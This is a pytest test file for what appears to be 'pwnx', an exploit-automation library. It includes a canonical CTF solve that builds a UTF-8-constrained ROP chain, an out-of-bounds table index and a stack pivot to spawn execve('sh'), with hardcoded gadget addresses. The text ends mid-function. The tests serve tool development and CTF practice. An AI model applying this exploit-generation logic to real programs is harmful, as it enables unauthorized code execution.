from __future__ import annotations

import ast
import os
from pathlib import Path
import subprocess

import pytest

import pwnx
from elf_factory import make_elf
from pwnx import Challenge, Trace, bytes_, choice, field, integer
from pwnx.actions import Emit, Encoded, Sequence
from pwnx.errors import ConstraintError, PlanningError
from pwnx.transport import Tube


TABLE = 0x2F08E8
BUFFER = 0x2F9E38
PIVOT_OFFSET = 80
PIVOT = 0x242D79
POP_RDI = 0x243565
POP_RSI = 0x243431
XOR_EAX = 0x247431
MOV_EDX_EAX = 0x2B184E
POP_RCX = 0x247566
MOV_EAX_ECX = 0x2B4E73
SYSCALL = 0x2A6602
MESSAGE_STORE_EXAMPLE = (
    Path(__file__).parents[1] / "examples" / "message_store_constrained.py"
)
MESSAGE_STORE_SUGAR = (
    Path(__file__).parents[1] / "examples" / "message_store_sugar.py"
)
DICE_CHALLENGE = Path(
    "/Users/brandonli/Downloads/pwn-challenges/dice-2026-quals/"
    "pwn_message-store"
)


CANONICAL = """
from pwnx import Challenge, bytes_, choice, field, integer, utf8

x = Challenge("./challenge")
store = x.protocol.menu(b"> ", name="store").define(
    message=choice(b"1", field(b"Message?", bytes_(max_size=0x1000), "data")),
    color=choice(b"2", field(b"> ", integer(delimiter=None), "index")),
    show=choice(b"3"),
)
message = x.buffer(
    "message", at=0x2f9e38, size=0x1000,
    writer=store.message, constraints=[utf8()],
)
dispatch = x.control(x.indirect_call(
    table=0x2f08e8, index=store.color,
    target=message.qword(80), trigger=store.show,
    state={"eax": message.address},
))
pivot = x.control(dispatch.pivot(
    stack=message, pointer_register="eax", gadget=0x242d79,
))
gadgets = x.rop.palette(
    pop={"rdi": 0x243565, "rsi": 0x243431, "rcx": 0x247566},
    zero={"rax": 0x247431},
    move={("rdx", "rax"): 0x2b184e, ("rax", "rcx"): 0x2b4e73},
    syscall=0x2a6602,
    constraints=[utf8()],
)
x.want(x.execve("sh"), via=pivot, using=gadgets)
x.run()
"""


class ScriptedTube(Tube):
    def __init__(self, incoming: bytes):
        super().__init__(timeout=0.1)
        self.incoming = bytearray(incoming)
        self.sent = bytearray()

    def _recv_raw(self, max_bytes, timeout):
        if not self.incoming:
            return b""
        data = bytes(self.incoming[:max_bytes])
        del self.incoming[:max_bytes]
        return data

    def _send_raw(self, data, timeout):
        self.sent.extend(data)
        return len(data)

    def _close_raw(self):
        pass


class FailingTube(Tube):
    def _recv_raw(self, max_bytes, timeout):
        raise AssertionError("replay attempted a live receive")

    def _send_raw(self, data, timeout):
        raise AssertionError("replay attempted a live send")

    def _close_raw(self):
        pass


def store_menu(challenge: Challenge):
    return challenge.protocol.menu(b"> ", name="store").define(
        message=choice(
            b"1",
            field(b"Message?", bytes_(max_size=0x1000), "data"),
        ),
        color=choice(
            b"2",
            field(b"> ", integer(delimiter=None), "index"),
        ),
        show=choice(b"3"),
    )


def configured_control(tmp_path: Path):
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    encoding = pwnx.utf8()
    message = challenge.buffer(
        "message",
        at=BUFFER,
        size=0x1000,
        writer=store.message,
        constraints=(encoding,),
    )
    dispatch = challenge.control(
        challenge.indirect_call(
            table=TABLE,
            index=store.color,
            target=message.qword(PIVOT_OFFSET),
            trigger=store.show,
            state={"eax": message.address},
        )
    )
    pivot = challenge.control(
        dispatch.pivot(
            stack=message,
            pointer_register="eax",
            gadget=PIVOT,
        )
    )
    gadgets = challenge.rop.palette(
        pop={"rdi": POP_RDI, "rsi": POP_RSI, "rcx": POP_RCX},
        zero={"rax": XOR_EAX},
        move={("rdx", "rax"): MOV_EDX_EAX, ("rax", "rcx"): MOV_EAX_ECX},
        syscall=SYSCALL,
        constraints=(encoding,),
    )
    challenge.want(
        challenge.execve("sh"),
        via=pivot,
        using=gadgets,
        terminal=False,
    )
    return challenge, message, gadgets


def configured_challenge(tmp_path: Path):
    challenge, _message, _gadgets = configured_control(tmp_path)
    return challenge


def sugar_challenge(tmp_path: Path):
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ",
        name="store",
        message=(1, b"Message?", bytes),
        color=(2, b"> ", int),
        show=3,
    )
    message = challenge.buffer(
        name="message", at=BUFFER, size=0x1000, encoding="utf8"
    ).written_by(store.message)
    dispatch = challenge.control(
        store.color.indexes(
            table=TABLE,
            target=message[PIVOT_OFFSET],
            trigger=store.show,
            eax=message,
        )
    )
    pivot = challenge.control(dispatch.pivot(eax=message, gadget=PIVOT))
    palette = challenge.rop(
        pop_rdi=POP_RDI,
        pop_rsi=POP_RSI,
        zero_rax=XOR_EAX,
        move_rdx_rax=MOV_EDX_EAX,
        pop_rcx=POP_RCX,
        move_rax_rcx=MOV_EAX_ECX,
        syscall=SYSCALL,
        constraint=pwnx.utf8(),
    )
    challenge.want(
        challenge.execve("sh"), via=pivot, using=palette, terminal=False
    )
    return challenge


def extract_payload(plan) -> tuple[bytes, int, bytes]:
    tube = ScriptedTube(b"> Message?> > > ")
    with plan.run(transport=tube):
        pass
    sent = bytes(tube.sent)
    message_end = sent.index(b"\n2\n")
    color_end = sent.index(b"\n", message_end + 3)
    return (
        sent[2:message_end],
        int(sent[message_end + 3 : color_end]),
        sent[color_end + 1 :],
    )


def attach_execve_goal(
    challenge: Challenge,
    store,
    *,
    address: int,
    table: int,
):
    encoding = pwnx.utf8()
    message = challenge.buffer(
        f"message-{address:x}",
        at=address,
        size=0x1000,
        writer=store.message,
        constraints=(encoding,),
    )
    dispatch = challenge.control(
        challenge.indirect_call(
            table=table,
            index=store.color,
            target=message.qword(PIVOT_OFFSET),
            trigger=store.show,
            state={"eax": message.address},
        )
    )
    pivot = challenge.control(
        dispatch.pivot(stack=message, pointer_register="eax", gadget=PIVOT)
    )
    palette = challenge.rop.palette(
        pop={"rdi": POP_RDI, "rsi": POP_RSI, "rcx": POP_RCX},
        zero={"rax": XOR_EAX},
        move={("rdx", "rax"): MOV_EDX_EAX, ("rax", "rcx"): MOV_EAX_ECX},
        syscall=SYSCALL,
        constraints=(encoding,),
    )
    challenge.want(
        challenge.execve("sh"), via=pivot, using=palette, terminal=False
    )
    return message, dispatch, pivot, palette


def sequence_names(plan) -> list[str]:
    names: list[str] = []

    def visit(action) -> None:
        if not isinstance(action, Sequence):
            return
        if action.name.startswith("store."):
            names.append(action.name)
        for child in action.actions:
            visit(child)

    for stage in plan.stages:
        for action in stage.actions:
            visit(action)
    return names


def codec_signature(codec) -> tuple:
    fields = tuple(
        (name, getattr(codec, name))
        for name in (
            "length",
            "delimiter",
            "drop_delimiter",
            "max_size",
            "base",
            "prefix",
            "maximum_digits",
            "signed",
        )
        if hasattr(codec, name)
    )
    return type(codec).__name__, fields


def contract_signature(action) -> tuple:
    contract = action.contract()

    def label(value):
        return getattr(value, "key", None) or getattr(value, "name", None) or str(value)

    return (
        tuple(label(item) for item in contract.requires),
        tuple(label(item) for item in contract.provides),
        tuple(sorted(contract.reads)),
        tuple(sorted(contract.writes)),
        tuple(label(item) for item in contract.invalidates),
        contract.scope.value,
    )


def action_signature(action) -> tuple:
    if isinstance(action, Sequence):
        return (
            "Sequence",
            action.name,
            contract_signature(action),
            tuple(action_signature(child) for child in action.actions),
        )
    if isinstance(action, Emit):
        data = action.data
        if isinstance(data, Encoded):
            data_signature = (
                "Encoded",
                codec_signature(data.codec),
                getattr(data.value, "key", data.value),
            )
        else:
            data_signature = ("raw", data)
        return (
            "Emit",
            data_signature,
            (
                action.channel.prompt,
                action.channel.terminator,
                action.channel.max_size,
                action.channel.timeout,
                action.channel.max_receive,
            ),
            contract_signature(action),
        )
    return (type(action).__name__, action.describe(), contract_signature(action))


def lowered_action_tree(plan) -> tuple:
    return tuple(
        (
            stage.name,
            stage.reason,
            tuple(action_signature(action) for action in stage.actions),
        )
        for stage in plan.stages
    )


def test_canonical_solve_contains_no_manual_rop_or_index_arithmetic() -> None:
    tree = ast.parse(CANONICAL)
    calls = [node for node in ast.walk(tree) if isinstance(node, ast.Call)]
    attributes = {
        node.attr for node in ast.walk(tree) if isinstance(node, ast.Attribute)
    }
    names = {node.id for node in ast.walk(tree) if isinstance(node, ast.Name)}

    assert not {"p64", "u64", "Payload", "ROPCompiler", "word"} & names
    assert not {"build", "to_bytes"} & attributes
    assert not any(
        isinstance(node, (ast.BinOp, ast.JoinedStr))
        and any(
            isinstance(child, ast.Name) and child.id.lower() in {"table", "buffer", "color"}
            for child in ast.walk(node)
        )
        for node in ast.walk(tree)
    )
    assert not any(isinstance(node, (ast.FunctionDef, ast.ClassDef, ast.Lambda)) for node in ast.walk(tree))
    assert len(calls) < 24


def test_shipped_message_store_example_uses_the_constrained_frontend() -> None:
    source = MESSAGE_STORE_EXAMPLE.read_text()
    tree = ast.parse(source)
    attributes = {
        node.attr for node in ast.walk(tree) if isinstance(node, ast.Attribute)
    }
    names = {node.id for node in ast.walk(tree) if isinstance(node, ast.Name)}

    assert not {"p64", "u64", "Payload", "ROPCompiler", "word"} & names
    assert not {"build", "to_bytes"} & attributes
    assert "indirect_call" in attributes
    assert "pivot" in attributes
    assert "palette" in attributes
    assert "execve" in attributes
    assert not any(
        isinstance(node, (ast.FunctionDef, ast.ClassDef, ast.Lambda))
        for node in ast.walk(tree)
    )


def test_optional_sugar_is_shorter_without_reintroducing_manual_mechanics() -> None:
    explicit = ast.parse(MESSAGE_STORE_EXAMPLE.read_text())
    sugar = ast.parse(MESSAGE_STORE_SUGAR.read_text())
    banned = {"p64", "u64", "word", "Payload", "ROPCompiler"}

    names = {node.id for node in ast.walk(sugar) if isinstance(node, ast.Name)}
    attributes = {
        node.attr for node in ast.walk(sugar) if isinstance(node, ast.Attribute)
    }
    explicit_calls = sum(isinstance(node, ast.Call) for node in ast.walk(explicit))
    sugar_calls = sum(isinstance(node, ast.Call) for node in ast.walk(sugar))

    assert not names & banned
    assert not {"build", "to_bytes"} & attributes
    assert sugar_calls < explicit_calls
    assert not any(
        isinstance(node, (ast.FunctionDef, ast.ClassDef, ast.Lambda))
        for node in ast.walk(sugar)
    )


def test_sugar_lowers_to_identical_plan_payload_and_index(tmp_path: Path) -> None:
    explicit_path = tmp_path / "explicit"
    sugar_path = tmp_path / "sugar"
    explicit_path.mkdir()
    sugar_path.mkdir()
    explicit = configured_challenge(explicit_path)
    sugar = sugar_challenge(sugar_path)

    explicit_plan = explicit.plan()
    sugar_plan = sugar.plan()
    explicit_payload = extract_payload(explicit_plan)
    sugar_payload = extract_payload(sugar_plan)

    assert sugar_plan.to_dict() == explicit_plan.to_dict()
    assert sugar_payload == explicit_payload


def test_sugar_and_explicit_forms_have_identical_lowered_actions_and_contracts(
    tmp_path: Path,
) -> None:
    explicit_path = tmp_path / "explicit"
    sugar_path = tmp_path / "sugar"
    explicit_path.mkdir()
    sugar_path.mkdir()

    explicit = configured_challenge(explicit_path).plan()
    sugar = sugar_challenge(sugar_path).plan()

    assert lowered_action_tree(sugar) == lowered_action_tree(explicit)


def test_menu_sugar_infers_fields_and_operations_are_callable(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ",
        name="store",
        message=(1, b"Message?", bytes),
        color=(2, b"> ", int),
        show=3,
    )

    message = store.message(b"hello")
    color = store.color(7)
    show = store.show()

    assert isinstance(message, Sequence)
    assert isinstance(color, Sequence)
    assert isinstance(show, Sequence)
    assert message.name.startswith("store.message#")
    assert color.name.startswith("store.color#")
    assert show.name.startswith("store.show#")


def test_buffer_sugar_writer_and_indexing_match_explicit_surface(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(b"> ", message=(1, b"Message?", bytes))
    message = challenge.buffer(
        at=BUFFER, size=0x1000, encoding="utf8"
    ).written_by(store.message)

    assert message.name == "buffer"
    assert message.address == BUFFER
    assert message.constraints == (pwnx.utf8(),)
    assert message[80].offset == 80
    assert message[80].size == 8


def test_buffer_sugar_binds_only_selected_writer_codec_and_shares_ids(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ",
        message=(1, b"Message?", bytes),
        other=(2, b"Other?", bytes),
    )
    message = challenge.buffer(
        at=BUFFER,
        size=0x1000,
        encoding="utf8",
    ).written_by(store.message)

    assert message.writer.definition.fields[0].codec.max_size == 0x1000
    assert store.menu.choices["message"].fields[0].codec.max_size == 0x100000
    assert store.menu.choices["other"].fields[0].codec.max_size == 0x100000
    assert store.other(b"A").name == "store.other#1"
    assert message.writer(b"B").name == "store.message#2"


def test_buffer_sugar_narrows_inferred_bytes_codec_to_buffer_size(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(b"> ", message=(1, b"Message?", bytes))

    message = challenge.buffer(at=BUFFER, size=0x1000).written_by(store.message)

    assert store.menu.choices["message"].fields[0].codec.max_size == 0x100000
    assert message.writer.definition.fields[0].codec.max_size == 0x1000


def test_buffer_sugar_does_not_widen_explicit_smaller_bytes_codec(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ", message=(1, b"Message?", bytes_(max_size=16))
    )

    message = challenge.buffer(at=BUFFER, size=0x1000).written_by(store.message)

    assert store.menu.choices["message"].fields[0].codec.max_size == 16
    assert message.writer.definition.fields[0].codec.max_size == 16


def test_sugar_and_explicit_writers_reject_oversize_at_same_codec_boundary(
    tmp_path: Path,
) -> None:
    explicit_challenge = Challenge(make_elf(tmp_path / "explicit", pie=False))
    explicit = explicit_challenge.protocol.menu(b"> ", name="store").define(
        message=choice(
            b"1", field(b"Message?", bytes_(max_size=8), "data")
        )
    )
    sugar_challenge = Challenge(make_elf(tmp_path / "sugar", pie=False))
    sugar = sugar_challenge.menu(b"> ", message=(1, b"Message?", bytes))
    sugar_buffer = sugar_challenge.buffer(at=BUFFER, size=8).written_by(sugar.message)

    explicit_data = explicit.message(b"A" * 9).actions[-1].data
    sugar_data = sugar_buffer.writer(b"A" * 9).actions[-1].data
    assert isinstance(explicit_data, Encoded)
    assert isinstance(sugar_data, Encoded)

    with pytest.raises(ConstraintError, match="9 bytes|maximum is 8"):
        explicit_data.build()
    with pytest.raises(ConstraintError, match="9 bytes|maximum is 8"):
        sugar_data.build()


@pytest.mark.parametrize(
    "order",
    [
        ("small", "large"),
        ("large", "small"),
    ],
)
def test_quick_operation_buffer_bindings_are_independent_and_order_invariant(
    tmp_path: Path,
    order: tuple[str, str],
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ", name="store", message=(1, b"Message?", bytes)
    )
    base_operation = store.message
    base_choice = store.menu.choices["message"]
    specifications = {
        "small": (BUFFER, 0x10),
        "large": (BUFFER + 0x2000, 0x1000),
    }
    bound = {}

    for name in order:
        address, size = specifications[name]
        bound[name] = challenge.buffer(
            name=name, at=address, size=size
        ).written_by(base_operation)

    base_codec = base_choice.fields[0].codec
    small_writer = bound["small"].writer
    large_writer = bound["large"].writer

    assert base_codec.max_size == 0x100000
    assert base_operation.definition is None
    assert store.menu.choices["message"] is base_choice
    assert small_writer is not base_operation
    assert large_writer is not base_operation
    assert small_writer is not large_writer
    assert small_writer.definition is not large_writer.definition
    assert small_writer.definition.fields[0].codec.max_size == 0x10
    assert large_writer.definition.fields[0].codec.max_size == 0x1000


def test_multi_buffer_bindings_lower_like_explicit_codecs_and_share_menu_ids(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ", name="store", message=(1, b"Message?", bytes)
    )
    small = challenge.buffer(
        name="small", at=BUFFER, size=0x10
    ).written_by(store.message)
    large = challenge.buffer(
        name="large", at=BUFFER + 0x2000, size=0x1000
    ).written_by(store.message)
    explicit_small = challenge.protocol.menu(b"> ", name="explicit-small").define(
        message=choice(
            b"1", field(b"Message?", bytes_(max_size=0x10), "data")
        )
    )
    explicit_large = challenge.protocol.menu(b"> ", name="explicit-large").define(
        message=choice(
            b"1", field(b"Message?", bytes_(max_size=0x1000), "data")
        )
    )

    small_action = small.writer(b"A")
    large_action = large.writer(b"B")
    explicit_small_action = explicit_small.message(b"A")
    explicit_large_action = explicit_large.message(b"B")

    assert codec_signature(small_action.actions[-1].data.codec) == codec_signature(
        explicit_small_action.actions[-1].data.codec
    )
    assert codec_signature(large_action.actions[-1].data.codec) == codec_signature(
        explicit_large_action.actions[-1].data.codec
    )
    assert small_action.name == "store.message#1"
    assert large_action.name == "store.message#2"


def test_multi_buffer_bound_writers_replay_without_identity_drift(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ", name="store", message=(1, b"Message?", bytes)
    )
    small = challenge.buffer(
        name="small", at=BUFFER, size=0x10
    ).written_by(store.message)
    large = challenge.buffer(
        name="large", at=BUFFER + 0x2000, size=0x1000
    ).written_by(store.message)
    challenge.sequence(small.writer(b"A"), name="small buffer write")
    challenge.want(large.writer(b"B"), terminal=False)
    plan = challenge.plan()
    trace = Trace()
    live = ScriptedTube(b"> Message?> Message?")

    with plan.run(transport=live, trace=trace):
        pass
    with plan.run(transport=FailingTube(), replay=trace):
        pass

    assert bytes(live.sent) == b"1\nA\n1\nB\n"


def test_index_operation_sugar_is_owned_by_its_challenge(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ",
        message=(1, b"Message?", bytes),
        color=(2, b"> ", int),
        show=3,
    )
    message = challenge.buffer(
        at=BUFFER, size=0x1000, encoding="utf8"
    ).written_by(store.message)

    dispatch = store.color.indexes(
        table=TABLE,
        target=message[80],
        trigger=store.show,
        eax=message,
    )

    assert dispatch.challenge is challenge
    assert dispatch.index == 4788


def test_pivot_register_keyword_sugar_normalizes_alias(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ",
        name="store",
        message=(1, b"Message?", bytes),
        color=(2, b"> ", int),
        show=3,
    )
    message = challenge.buffer(
        at=BUFFER, size=0x1000, encoding="utf8"
    ).written_by(store.message)
    dispatch = store.color.indexes(
        table=TABLE,
        target=message[80],
        trigger=store.show,
        eax=message,
    )

    pivot = dispatch.pivot(eax=message, gadget=PIVOT)

    assert pivot.pointer_register == "rax"
    assert pivot.stack is message


def test_callable_rop_sugar_maps_keywords_to_semantic_palette(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))

    palette = challenge.rop(
        pop_rdi=POP_RDI,
        zero_eax=XOR_EAX,
        move_edx_eax=MOV_EDX_EAX,
        syscall=SYSCALL,
        constraint=pwnx.utf8(),
    )

    assert palette.pop["rdi"] == POP_RDI
    assert palette.zero["rax"] == XOR_EAX
    assert palette.move[("rdx", "rax")] == MOV_EDX_EAX
    assert palette.syscall == SYSCALL
    assert palette.constraints == (pwnx.utf8(),)


@pytest.mark.parametrize(
    "operations",
    [
        {"broken": ()},
        {"broken": (1, b"prompt only")},
        {"broken": (1, b"value: ", float)},
        {"broken": object()},
    ],
)
def test_menu_sugar_rejects_malformed_operation_specs(
    tmp_path: Path,
    operations: dict,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    with pytest.raises((TypeError, ValueError), match="operation|menu|field|type|spec"):
        challenge.menu(b"> ", **operations)


@pytest.mark.parametrize(
    "keyword",
    [
        "pop",
        "pop_unknown",
        "move_rax",
        "move_rax_rcx_extra",
        "zero",
        "syscall_extra",
        "constraint",
    ],
)
def test_callable_rop_sugar_rejects_malformed_gadget_keywords(
    tmp_path: Path,
    keyword: str,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    with pytest.raises(
        (TypeError, PlanningError),
        match="gadget|keyword|rop|semantic|register|constraint",
    ):
        challenge.rop(**{keyword: POP_RDI})


def test_constrained_control_plan_is_semantic_and_compact(tmp_path: Path) -> None:
    plan = configured_challenge(tmp_path).plan()
    rendered = plan.show().lower()
    for phrase in (
        "controlled buffer",
        "utf-8",
        "indexed indirect call",
        "stack pivot",
        "execve",
        "constrained rop",
    ):
        assert phrase in rendered
    assert "payload(" not in rendered
    assert "object at 0x" not in rendered
    assert len(rendered) < 8_000


def test_constrained_control_planning_is_idempotent(tmp_path: Path) -> None:
    challenge = configured_challenge(tmp_path)
    assert challenge.plan().to_dict() == challenge.plan().to_dict()


def test_pwnx_builds_utf8_payload_and_computes_oob_index(tmp_path: Path) -> None:
    plan = configured_challenge(tmp_path).plan()
    payload, color, trailing = extract_payload(plan)

    payload.decode("utf-8")
    assert int.from_bytes(payload[PIVOT_OFFSET : PIVOT_OFFSET + 8], "little") == PIVOT
    assert color == (BUFFER + PIVOT_OFFSET - TABLE) // 8
    assert trailing == b"3\n"

    path_pointer = int.from_bytes(payload[8:16], "little")
    path_offset = path_pointer - BUFFER
    assert 0 <= path_offset <= len(payload) - 3
    assert payload[path_offset : path_offset + 3] == b"sh\x00"


def test_constrained_control_trace_replays_without_live_effects(tmp_path: Path) -> None:
    plan = configured_challenge(tmp_path).plan()
    trace = Trace()
    live = ScriptedTube(b"> Message?> > > ")

    with plan.run(transport=live, trace=trace):
        pass
    with plan.run(transport=FailingTube(), replay=trace):
        pass


def test_sugar_trace_replays_with_the_same_menu_identity(tmp_path: Path) -> None:
    plan = sugar_challenge(tmp_path).plan()
    trace = Trace()
    live = ScriptedTube(b"> Message?> > > ")

    with plan.run(transport=live, trace=trace):
        pass
    with plan.run(transport=FailingTube(), replay=trace):
        pass

    assert sequence_names(plan) == [
        "store.message#1",
        "store.color#2",
        "store.show#3",
    ]


def test_buffer_rejects_qword_slot_outside_declared_storage(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    message = challenge.buffer(
        "message",
        at=BUFFER,
        size=32,
        writer=store_menu(challenge).message,
        constraints=(pwnx.utf8(),),
    )
    with pytest.raises(PlanningError, match="buffer|outside|qword"):
        message.qword(32)


def test_indexed_call_rejects_unaligned_table_target(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    message = challenge.buffer(
        "message",
        at=BUFFER,
        size=0x100,
        writer=store.message,
        constraints=(pwnx.utf8(),),
    )
    with pytest.raises(PlanningError, match="index|aligned|entry"):
        challenge.indirect_call(
            table=TABLE,
            index=store.color,
            target=message.qword(1),
            trigger=store.show,
            state={"eax": message.address},
        )


def test_pivot_requires_register_to_point_at_declared_buffer(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    message = challenge.buffer(
        "message",
        at=BUFFER,
        size=0x100,
        writer=store.message,
        constraints=(pwnx.utf8(),),
    )
    dispatch = challenge.indirect_call(
        table=TABLE,
        index=store.color,
        target=message.qword(80),
        trigger=store.show,
        state={"eax": message.address + 8},
    )
    with pytest.raises(PlanningError, match="eax|buffer|points"):
        dispatch.pivot(stack=message, pointer_register="eax", gadget=PIVOT)


def test_palette_rejects_gadget_address_that_violates_utf8(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    with pytest.raises(ConstraintError, match="utf-8|encoding|gadget"):
        challenge.rop.palette(
            pop={"rdi": 0x242D80},
            syscall=SYSCALL,
            constraints=(pwnx.utf8(),),
        )


def test_execve_reports_missing_register_realization(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    message = challenge.buffer(
        "message",
        at=BUFFER,
        size=0x1000,
        writer=store.message,
        constraints=(pwnx.utf8(),),
    )
    dispatch = challenge.control(
        challenge.indirect_call(
            table=TABLE,
            index=store.color,
            target=message.qword(80),
            trigger=store.show,
            state={"eax": message.address},
        )
    )
    pivot = challenge.control(
        dispatch.pivot(stack=message, pointer_register="eax", gadget=PIVOT)
    )
    incomplete = challenge.rop.palette(
        pop={"rdi": POP_RDI, "rsi": POP_RSI},
        syscall=SYSCALL,
        constraints=(pwnx.utf8(),),
    )
    challenge.want(
        challenge.execve("sh"),
        via=pivot,
        using=incomplete,
        terminal=False,
    )
    with pytest.raises(PlanningError, match="rax|rdx|register|realize"):
        challenge.plan()


def test_controlled_buffer_layout_emits_explicit_stored_data(tmp_path: Path) -> None:
    challenge, message, _gadgets = configured_control(tmp_path)
    message.store(b"VISIBLE", offset=0xA0)

    payload, _color, _trailing = extract_payload(challenge.plan())

    assert payload[0xA0 : 0xA7] == b"VISIBLE"


@pytest.mark.parametrize("dispatch_offset", [0, 8, 0x40])
def test_dispatch_slot_rejects_rop_qword_overlap(
    tmp_path: Path,
    dispatch_offset: int,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    message = challenge.buffer(
        "message", at=BUFFER, size=0x1000, writer=store.message,
        constraints=(pwnx.utf8(),),
    )
    dispatch = challenge.control(
        challenge.indirect_call(
            table=TABLE,
            index=store.color,
            target=message.qword(dispatch_offset),
            trigger=store.show,
            state={"eax": message.address},
        )
    )
    pivot = challenge.control(
        dispatch.pivot(stack=message, pointer_register="eax", gadget=PIVOT)
    )
    palette = challenge.rop.palette(
        pop={"rdi": POP_RDI, "rsi": POP_RSI, "rcx": POP_RCX},
        zero={"rax": XOR_EAX},
        move={("rdx", "rax"): MOV_EDX_EAX, ("rax", "rcx"): MOV_EAX_ECX},
        syscall=SYSCALL,
        constraints=(pwnx.utf8(),),
    )
    challenge.want(
        challenge.execve("sh"), via=pivot, using=palette, terminal=False
    )

    with pytest.raises(PlanningError, match="overlap|dispatch|rop|layout"):
        challenge.plan()


def test_dispatch_qword_rejects_partial_stored_data_overlap(tmp_path: Path) -> None:
    challenge, message, _gadgets = configured_control(tmp_path)
    with pytest.raises(PlanningError, match="overlap|dispatch|stored|layout"):
        message.store(b"PART", offset=PIVOT_OFFSET + 4)


def test_stored_data_rejects_rop_chain_overlap(tmp_path: Path) -> None:
    challenge, message, _gadgets = configured_control(tmp_path)
    with pytest.raises(PlanningError, match="overlap|stored|rop|layout"):
        message.store(b"CHAIN", offset=0x20)


def test_path_placement_avoids_stored_dispatch_and_rop_ranges(tmp_path: Path) -> None:
    challenge, message, _gadgets = configured_control(tmp_path)
    marker = message.store(b"MARKER", offset=0x58)

    payload, _color, _trailing = extract_payload(challenge.plan())
    path_pointer = int.from_bytes(payload[8:16], "little")
    path_offset = path_pointer - BUFFER

    assert payload[marker.offset : marker.offset + marker.size] == b"MARKER"
    assert not (marker.offset <= path_offset < marker.offset + marker.size)
    assert not (PIVOT_OFFSET <= path_offset < PIVOT_OFFSET + 8)
    assert path_offset >= 0x58


def test_rop_palette_rejects_foreign_challenge(tmp_path: Path) -> None:
    first_path = tmp_path / "first"
    second_path = tmp_path / "second"
    first_path.mkdir()
    second_path.mkdir()
    first = configured_challenge(first_path)
    second = configured_challenge(second_path)
    foreign = second.rop.palette(
        pop={"rdi": POP_RDI, "rsi": POP_RSI, "rcx": POP_RCX},
        zero={"rax": XOR_EAX},
        move={("rdx", "rax"): MOV_EDX_EAX, ("rax", "rcx"): MOV_EAX_ECX},
        syscall=SYSCALL,
        constraints=(pwnx.utf8(),),
    )
    goal = first._goals[0]

    with pytest.raises(PlanningError, match="palette|challenge|artifact|foreign"):
        first.want(goal.effect, via=goal.via, using=foreign, terminal=False)


def test_rop_palette_carries_target_artifact_identity(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    palette = challenge.rop.palette(
        pop={"rdi": POP_RDI},
        syscall=SYSCALL,
        constraints=(pwnx.utf8(),),
    )

    assert palette.artifact_sha256 == challenge.exe.sha256


@pytest.mark.parametrize(
    "instruction",
    [
        "xor eax, ebx; ret",
        "xor eax, eax, ebx; ret",
        "pop rdi, rsi; ret",
        "mov eax, ecx, edx; ret",
    ],
)
def test_pinned_palette_rejects_ambiguous_or_extra_operands(
    tmp_path: Path,
    instruction: str,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    with pytest.raises(PlanningError, match="gadget|semantic|operand|unsupported"):
        challenge.rop.palette(
            pinned={instruction: XOR_EAX},
            constraint=pwnx.utf8(),
        )


def test_pinned_palette_normalizes_32_and_64_bit_register_aliases(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    palette = challenge.rop.palette(
        pinned={
            "pop rdi; ret": POP_RDI,
            "xor eax, eax; ret": XOR_EAX,
            "mov edx, eax; ret": MOV_EDX_EAX,
            "mov eax, ecx; ret": MOV_EAX_ECX,
            "syscall": SYSCALL,
        },
        constraint=pwnx.utf8(),
    )

    assert palette.zero["rax"] == XOR_EAX
    assert palette.move[("rdx", "rax")] == MOV_EDX_EAX
    assert palette.move[("rax", "rcx")] == MOV_EAX_ECX


def test_plan_show_is_semantic_and_expand_contains_generated_payload(
    tmp_path: Path,
) -> None:
    plan = configured_challenge(tmp_path).plan()
    rendered = plan.show().lower()

    for phrase in (
        "controlled buffer message",
        "0x2f9e38",
        "table 0x2f08e8",
        "index 4788",
        "eax",
        "stack pivot",
        "0x242d79",
        "constrained rop palette",
    ):
        assert phrase in rendered
    assert "bytescodec(b'" not in rendered
    assert "\\x00\\x00\\x00" not in rendered

    expanded = plan.expand(plan.stages[0].name).lower()
    assert "message?" in expanded
    assert "bytescodec(b'" in expanded
    assert "delimitedintegercodec(4788)" in expanded
    assert "send b'3'" in expanded


def test_two_prepared_goals_allocate_unique_menu_operation_ids(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
